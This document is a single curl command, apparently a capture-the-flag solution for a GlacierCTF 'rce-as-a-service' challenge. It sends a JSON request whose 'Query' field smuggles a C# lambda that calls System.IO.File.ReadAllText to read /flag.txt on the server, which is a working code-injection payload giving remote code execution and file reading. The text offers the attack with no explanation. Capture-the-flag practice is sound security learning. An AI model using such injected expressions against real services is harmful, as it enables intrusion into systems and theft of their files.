curl --request POST \ --url https://rce-as-a-service-1.ctf.glacierctf.com/rce \
      --header 'Content-Type: application/json' \
      --data '{
  "Data": ["placeholder"],
  "Query": "(data) => data.Select(d => System.IO.File.ReadAllText(\"/flag.txt\"))"
  }'
